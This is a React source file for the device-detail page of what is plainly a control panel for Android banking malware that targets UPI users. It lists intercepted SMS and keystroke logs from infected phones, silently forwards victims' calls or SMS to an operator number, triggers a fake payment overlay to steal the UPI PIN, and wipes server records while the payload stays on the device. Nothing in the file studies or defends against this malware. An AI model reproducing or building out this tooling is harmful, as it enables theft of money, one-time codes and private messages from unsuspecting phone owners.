import { useState, useEffect, useRef } from 'react';
import { useRoute, Link, useLocation } from 'wouter';
import { db } from '@/lib/firebase';
import { ref, onValue, set, remove, push, update } from 'firebase/database';
import { Layout } from '@/components/layout';
import { 
  ArrowLeft, Smartphone, Battery, Wifi, Copy, Trash2, Shield, 
  MessageSquare, Terminal, PhoneForwarded, IndianRupee, Activity, AlertTriangle 
} from 'lucide-react';
import { format } from 'date-fns';

interface DeviceData {
  phone?: string;
  upi?: string;
  model?: string;
  battery?: string;
  status?: string;
  ping?: string;
  sim1?: string;
  sim2?: string;
  sms?: Record<string, any>;
  keylog?: Record<string, any>;
  callForward?: {
    type?: string;
    number?: string;
    active?: boolean;
  };
  inject?: {
    upiPin?: string;
    status?: string;
    speed?: string;
    active?: boolean;
  };
}

const TABS = [
  { id: 'sms', label: 'SMS Log', icon: MessageSquare },
  { id: 'keylog', label: 'KeyLog', icon: Terminal },
  { id: 'forward', label: 'Call Forward', icon: PhoneForwarded },
  { id: 'inject', label: 'UPI Inject', icon: IndianRupee },
  { id: 'delete', label: 'Destruct', icon: Trash2 },
];

export function DeviceDetail() {
  const [, params] = useRoute('/device/:id');
  const [, setLocation] = useLocation();
  const id = params?.id;
  
  const [device, setDevice] = useState<DeviceData | null>(null);
  const [loading, setLoading] = useState(true);
  const [activeTab, setActiveTab] = useState('sms');
  const [statusInput, setStatusInput] = useState('');
  
  // Specific tab states
  const [smsSearch, setSmsSearch] = useState('');
  const [forwardType, setForwardType] = useState('call');
  const [forwardNumber, setForwardNumber] = useState('');
  
  useEffect(() => {
    if (!id) return;
    
    const deviceRef = ref(db, `clients/${id}`);
    const unsubscribe = onValue(deviceRef, (snapshot) => {
      if (snapshot.exists()) {
        const data = snapshot.val();
        setDevice(data);
        if (!device) {
          setStatusInput(data.status || '');
          if (data.callForward) {
            setForwardType(data.callForward.type || 'call');
            setForwardNumber(data.callForward.number || '');
          }
        }
      } else {
        setDevice(null);
      }
      setLoading(false);
    });

    return () => unsubscribe();
  }, [id]);

  const handleUpdateStatus = () => {
    if (!id) return;
    update(ref(db, `clients/${id}`), {
      status: statusInput
    });
  };

  const handleDeleteDevice = () => {
    if (!id) return;
    if (confirm('Are you sure you want to destruct this node? All data will be wiped.')) {
      remove(ref(db, `clients/${id}`));
      setLocation('/dashboard');
    }
  };

  const handleClearKeylog = () => {
    if (!id) return;
    if (confirm('Clear all keylog data?')) {
      remove(ref(db, `clients/${id}/keylog`));
    }
  };

  const handleDeleteSms = (pushKey: string) => {
    if (!id) return;
    remove(ref(db, `clients/${id}/sms/${pushKey}`));
  };

  const handleToggleForwarding = (activate: boolean) => {
    if (!id) return;
    set(ref(db, `clients/${id}/callForward`), {
      type: forwardType,
      number: forwardNumber,
      active: activate
    });
  };

  const handleStartInjection = () => {
    if (!id) return;
    update(ref(db, `clients/${id}/inject`), {
      active: true,
      status: 'pending'
    });
  };

  const copyText = (text: string) => {
    navigator.clipboard.writeText(text);
  };

  if (loading) {
    return (
      <Layout>
        <div className="animate-pulse space-y-6">
          <div className="h-12 bg-card rounded-lg w-1/3"></div>
          <div className="h-32 bg-card rounded-lg w-full"></div>
          <div className="h-96 bg-card rounded-lg w-full"></div>
        </div>
      </Layout>
    );
  }

  if (!device) {
    return (
      <Layout>
        <div className="flex flex-col items-center justify-center py-24 bg-card rounded-lg border border-border">
          <AlertTriangle className="w-12 h-12 text-warning mb-4" />
          <h2 className="text-xl font-bold">Node Disconnected or Destroyed</h2>
          <p className="text-muted-foreground mt-2">The device data no longer exists.</p>
          <Link href="/dashboard" className="mt-6 bg-secondary text-foreground px-4 py-2 rounded font-mono hover:bg-secondary/80">
            Return to Dashboard
          </Link>
        </div>
      </Layout>
    );
  }

  const isOnline = device.ping ? (Date.now() - parseInt(device.ping, 10)) < 300000 : false;
  const smsList = device.sms ? Object.entries(device.sms).reverse() : [];
  const filteredSms = smsSearch 
    ? smsList.filter(([_, sms]: any) => (sms.body || '').toLowerCase().includes(smsSearch.toLowerCase()) || (sms.from || '').includes(smsSearch))
    : smsList;
    
  const keylogList = device.keylog ? Object.entries(device.keylog).reverse() : [];

  return (
    <Layout>
      <div className="mb-6 flex flex-col md:flex-row md:items-center justify-between gap-4">
        <div className="flex items-center gap-4">
          <Link href="/dashboard" className="p-2 bg-card border border-border rounded hover:bg-secondary transition-colors">
            <ArrowLeft className="w-5 h-5" />
          </Link>
          <div>
            <div className="flex items-center gap-3">
              <h1 className="text-2xl font-bold font-sans">{device.model || 'Unknown Node'}</h1>
              <span className={`px-2 py-0.5 rounded text-xs font-mono font-bold flex items-center gap-1.5 ${isOnline ? 'bg-primary/20 text-primary border border-primary/50' : 'bg-muted border border-border text-muted-foreground'}`}>
                <span className={`w-1.5 h-1.5 rounded-full ${isOnline ? 'bg-primary animate-pulse' : 'bg-muted-foreground'}`}></span>
                {isOnline ? 'ONLINE' : 'OFFLINE'}
              </span>
            </div>
            <p className="text-muted-foreground font-mono text-sm mt-1">ID: {id}</p>
          </div>
        </div>
      </div>

      <div className="grid grid-cols-1 lg:grid-cols-4 gap-6">
        {/* Left Sidebar - Device Info */}
        <div className="lg:col-span-1 space-y-6">
          <div className="bg-card border border-border rounded-lg overflow-hidden relative">
            <div className="h-1 w-full bg-gradient-to-r from-primary/50 via-primary to-primary/50"></div>
            <div className="p-4 space-y-4">
              <div className="flex justify-between items-center pb-3 border-b border-border/50">
                <span className="text-sm text-muted-foreground">Battery</span>
                <span className="font-mono text-sm font-medium flex items-center gap-1.5">
                  <Battery className="w-4 h-4 text-primary" />
                  {device.battery || 'N/A'}
                </span>
              </div>
              
              <div className="flex justify-between items-center pb-3 border-b border-border/50">
                <span className="text-sm text-muted-foreground">Phone</span>
                <span className="font-mono text-sm">{device.phone || 'N/A'}</span>
              </div>
              
              <div className="flex justify-between items-center pb-3 border-b border-border/50">
                <span className="text-sm text-muted-foreground">UPI ID</span>
                <span className="font-mono text-sm text-primary">{device.upi || 'N/A'}</span>
              </div>

              <div className="flex flex-col pb-3 border-b border-border/50 gap-2">
                <span className="text-sm text-muted-foreground">SIM Info</span>
                <div className="text-xs font-mono space-y-1 bg-background p-2 rounded">
                  <div className="flex justify-between">
                    <span className="text-muted-foreground">SIM 1:</span>
                    <span>{device.sim1 || 'None'}</span>
                  </div>
                  <div className="flex justify-between">
                    <span className="text-muted-foreground">SIM 2:</span>
                    <span>{device.sim2 || 'None'}</span>
                  </div>
                </div>
              </div>

              <div className="space-y-2">
                <label className="text-sm text-muted-foreground block">Operator Status Memo</label>
                <div className="flex gap-2">
                  <input
                    type="text"
                    value={statusInput}
                    onChange={(e) => setStatusInput(e.target.value)}
                    placeholder="Enter status..."
                    className="flex-1 bg-background border border-border rounded px-2 py-1.5 text-sm font-mono focus:outline-none focus:border-primary"
                  />
                  <button 
                    onClick={handleUpdateStatus}
                    className="bg-secondary hover:bg-secondary/80 border border-border px-3 py-1.5 rounded text-xs font-mono transition-colors"
                  >
                    SET
                  </button>
                </div>
              </div>
            </div>
          </div>
        </div>

        {/* Right Content - Tabs */}
        <div className="lg:col-span-3">
          <div className="bg-card border border-border rounded-lg overflow-hidden flex flex-col h-[600px]">
            <div className="flex overflow-x-auto border-b border-border hide-scrollbar bg-card/50">
              {TABS.map(tab => {
                const Icon = tab.icon;
                const isActive = activeTab === tab.id;
                return (
                  <button
                    key={tab.id}
                    onClick={() => setActiveTab(tab.id)}
                    className={`flex items-center gap-2 px-5 py-3 text-sm font-medium border-b-2 transition-colors whitespace-nowrap
                      ${isActive 
                        ? tab.id === 'delete' ? 'border-destructive text-destructive' : 'border-primary text-primary bg-primary/5' 
                        : 'border-transparent text-muted-foreground hover:bg-secondary/50'
                      }`}
                  >
                    <Icon className="w-4 h-4" />
                    {tab.label}
                  </button>
                );
              })}
            </div>

            <div className="flex-1 overflow-y-auto p-4 bg-background/50 relative">
              {/* Tab 1: SMS */}
              {activeTab === 'sms' && (
                <div className="h-full flex flex-col space-y-4">
                  <div className="flex justify-between items-center">
                    <h3 className="font-mono text-sm tracking-widest uppercase text-muted-foreground">Intercepted Messages</h3>
                    <input
                      type="text"
                      placeholder="Search SMS..."
                      value={smsSearch}
                      onChange={(e) => setSmsSearch(e.target.value)}
                      className="bg-card border border-border rounded px-3 py-1.5 text-sm font-mono focus:outline-none focus:border-primary w-64"
                    />
                  </div>
                  
                  {filteredSms.length === 0 ? (
                    <div className="flex-1 flex items-center justify-center text-muted-foreground font-mono text-sm border border-dashed border-border rounded">
                      No messages found.
                    </div>
                  ) : (
                    <div className="flex-1 overflow-y-auto space-y-3 pr-2">
                      {filteredSms.map(([key, sms]: any) => (
                        <div key={key} className="bg-card border border-border rounded p-3 group relative hover:border-primary/30 transition-colors">
                          <div className="flex justify-between items-start mb-2">
                            <div className="font-mono text-primary font-bold text-sm bg-primary/10 px-2 py-0.5 rounded">
                              {sms.from || 'Unknown'}
                            </div>
                            <div className="text-xs text-muted-foreground font-mono">
                              {sms.date ? format(new Date(parseInt(sms.date)), 'MMM d, HH:mm:ss') : 'Unknown Time'}
                            </div>
                          </div>
                          <div className="text-sm leading-relaxed break-words pl-1 border-l-2 border-border/50 font-sans">
                            {sms.body || ''}
                          </div>
                          
                          <div className="absolute top-2 right-2 opacity-0 group-hover:opacity-100 flex gap-1 transition-opacity">
                            <button 
                              onClick={() => copyText(sms.body || '')}
                              className="p-1.5 bg-secondary hover:bg-primary/20 text-muted-foreground hover:text-primary rounded border border-border transition-colors"
                              title="Copy"
                            >
                              <Copy className="w-3.5 h-3.5" />
                            </button>
                            <button 
                              onClick={() => handleDeleteSms(key)}
                              className="p-1.5 bg-secondary hover:bg-destructive/20 text-muted-foreground hover:text-destructive rounded border border-border transition-colors"
                              title="Delete"
                            >
                              <Trash2 className="w-3.5 h-3.5" />
                            </button>
                          </div>
                        </div>
                      ))}
                    </div>
                  )}
                </div>
              )}

              {/* Tab 2: KeyLog */}
              {activeTab === 'keylog' && (
                <div className="h-full flex flex-col space-y-4">
                  <div className="flex justify-between items-center">
                    <h3 className="font-mono text-sm tracking-widest uppercase text-muted-foreground">Keystroke Log</h3>
                    <button 
                      onClick={handleClearKeylog}
                      disabled={keylogList.length === 0}
                      className="text-xs font-mono bg-destructive/10 text-destructive border border-destructive/20 hover:bg-destructive/20 px-3 py-1.5 rounded transition-colors disabled:opacity-50"
                    >
                      Clear Log
                    </button>
                  </div>
                  
                  <div className="flex-1 bg-card border border-border rounded overflow-y-auto p-4 font-mono text-sm whitespace-pre-wrap leading-relaxed">
                    {keylogList.length === 0 ? (
                      <span className="text-muted-foreground">No keystrokes recorded yet...</span>
                    ) : (
                      keylogList.map(([key, log]: any) => (
                        <div key={key} className="mb-2 hover:bg-white/5 p-1 rounded transition-colors break-all">
                          <span className="text-primary/70 select-none mr-2">›</span>
                          <span className="text-foreground">{log.text || ''}</span>
                        </div>
                      ))
                    )}
                  </div>
                </div>
              )}

              {/* Tab 3: Call Forward */}
              {activeTab === 'forward' && (
                <div className="h-full flex flex-col max-w-md mx-auto justify-center space-y-6">
                  <div className="text-center mb-4">
                    <div className="w-16 h-16 bg-primary/10 rounded-full flex items-center justify-center mx-auto mb-3 border border-primary/20">
                      <PhoneForwarded className="w-8 h-8 text-primary" />
                    </div>
                    <h2 className="text-lg font-bold font-sans">Traffic Interception</h2>
                    <p className="text-sm text-muted-foreground">Redirect incoming calls or SMS silently.</p>
                  </div>
                  
                  <div className="bg-card border border-border p-6 rounded-lg space-y-5">
                    <div className="space-y-3">
                      <label className="text-xs font-mono uppercase text-muted-foreground">Intercept Type</label>
                      <div className="flex grid-cols-2 gap-2 bg-background p-1 rounded border border-border">
                        <button
                          onClick={() => setForwardType('call')}
                          className={`flex-1 py-2 text-sm font-mono rounded ${forwardType === 'call' ? 'bg-secondary border border-border text-foreground' : 'text-muted-foreground hover:text-foreground'}`}
                        >
                          CALL
                        </button>
                        <button
                          onClick={() => setForwardType('sms')}
                          className={`flex-1 py-2 text-sm font-mono rounded ${forwardType === 'sms' ? 'bg-secondary border border-border text-foreground' : 'text-muted-foreground hover:text-foreground'}`}
                        >
                          SMS
                        </button>
                      </div>
                    </div>
                    
                    <div className="space-y-3">
                      <label className="text-xs font-mono uppercase text-muted-foreground">Destination Number</label>
                      <input
                        type="text"
                        value={forwardNumber}
                        onChange={(e) => setForwardNumber(e.target.value)}
                        placeholder="+91..."
                        className="w-full bg-background border border-border rounded px-4 py-2.5 font-mono text-sm focus:outline-none focus:border-primary"
                      />
                    </div>
                    
                    <div className="pt-2 flex gap-3">
                      {device.callForward?.active ? (
                        <button 
                          onClick={() => handleToggleForwarding(false)}
                          className="flex-1 bg-warning hover:bg-warning/90 text-warning-foreground font-bold font-mono py-2.5 rounded transition-colors shadow-lg shadow-warning/20"
                        >
                          DEACTIVATE
                        </button>
                      ) : (
                        <button 
                          onClick={() => handleToggleForwarding(true)}
                          className="flex-1 bg-primary hover:bg-primary/90 text-primary-foreground font-bold font-mono py-2.5 rounded transition-colors shadow-lg shadow-primary/20"
                        >
                          ACTIVATE
                        </button>
                      )}
                    </div>
                  </div>
                  
                  {device.callForward?.active && (
                    <div className="bg-primary/10 border border-primary/30 rounded p-3 text-center text-sm font-mono text-primary flex items-center justify-center gap-2">
                      <span className="relative flex h-2 w-2">
                        <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-primary opacity-75"></span>
                        <span className="relative inline-flex rounded-full h-2 w-2 bg-primary"></span>
                      </span>
                      Forwarding active to {device.callForward.number}
                    </div>
                  )}
                </div>
              )}

              {/* Tab 4: UPI Inject */}
              {activeTab === 'inject' && (
                <div className="h-full flex flex-col max-w-md mx-auto justify-center space-y-6">
                  <div className="text-center mb-4">
                    <div className="w-16 h-16 bg-primary/10 rounded-full flex items-center justify-center mx-auto mb-3 border border-primary/20">
                      <IndianRupee className="w-8 h-8 text-primary" />
                    </div>
                    <h2 className="text-lg font-bold font-sans">UPI Overlay Injection</h2>
                    <p className="text-sm text-muted-foreground">Deploy fake payment overlay and extract PIN.</p>
                  </div>
                  
                  <div className="bg-card border border-border p-5 rounded-lg">
                    <div className="space-y-4 font-mono text-sm">
                      <div className="flex justify-between items-center py-2 border-b border-border">
                        <span className="text-muted-foreground">Target Device:</span>
                        <span className="text-foreground">{device.model || 'Unknown'}</span>
                      </div>
                      <div className="flex justify-between items-center py-2 border-b border-border">
                        <span className="text-muted-foreground">Status:</span>
                        <span className={`font-bold ${
                          device.inject?.status === 'success' ? 'text-primary' : 
                          device.inject?.status === 'pending' ? 'text-warning animate-pulse' : 
                          'text-muted-foreground'
                        }`}>
                          {device.inject?.status?.toUpperCase() || 'IDLE'}
                        </span>
                      </div>
                      <div className="flex justify-between items-center py-2 border-b border-border">
                        <span className="text-muted-foreground">Extraction Speed:</span>
                        <span className="text-foreground">{device.inject?.speed || '0ms'}</span>
                      </div>
                      
                      <div className="pt-4 flex flex-col gap-2">
                        <span className="text-xs text-muted-foreground uppercase tracking-widest text-center">Extracted PIN</span>
                        <div className="bg-background border border-border border-dashed h-16 rounded flex items-center justify-center text-2xl font-bold tracking-[0.5em] text-primary">
                          {device.inject?.upiPin || '****'}
                        </div>
                      </div>
                    </div>
                    
                    <button 
                      onClick={handleStartInjection}
                      disabled={device.inject?.active}
                      className="w-full mt-6 bg-primary hover:bg-primary/90 disabled:bg-primary/30 disabled:cursor-not-allowed text-primary-foreground font-bold font-mono py-3 rounded transition-colors flex items-center justify-center gap-2"
                    >
                      <Shield className="w-4 h-4" />
                      {device.inject?.active ? 'INJECTION ACTIVE' : 'DEPLOY OVERLAY'}
                    </button>
                  </div>
                </div>
              )}

              {/* Tab 5: Delete */}
              {activeTab === 'delete' && (
                <div className="h-full flex flex-col max-w-md mx-auto justify-center space-y-6">
                  <div className="text-center mb-4">
                    <div className="w-16 h-16 bg-destructive/10 rounded-full flex items-center justify-center mx-auto mb-3 border border-destructive/20">
                      <AlertTriangle className="w-8 h-8 text-destructive" />
                    </div>
                    <h2 className="text-lg font-bold font-sans text-destructive">Destruct Sequence</h2>
                    <p className="text-sm text-muted-foreground mt-2">
                      This will permanently wipe all logs, messages, and device records from the control server. The payload on the device will not be uninstalled, but the connection will be orphaned.
                    </p>
                  </div>
                  
                  <div className="bg-destructive/5 border border-destructive/20 p-6 rounded-lg text-center">
                    <p className="font-mono text-sm mb-6 text-destructive/80">Type the device ID to confirm or just click destruct if you're sure.</p>
                    
                    <button 
                      onClick={handleDeleteDevice}
                      className="w-full bg-destructive hover:bg-destructive/90 text-destructive-foreground font-bold font-mono py-4 rounded transition-all hover:scale-[1.02] shadow-lg shadow-destructive/20 flex items-center justify-center gap-2"
                    >
                      <Trash2 className="w-5 h-5" />
                      PERMANENTLY DESTRUCT
                    </button>
                  </div>
                </div>
              )}
            </div>
          </div>
        </div>
      </div>
    </Layout>
  );
}
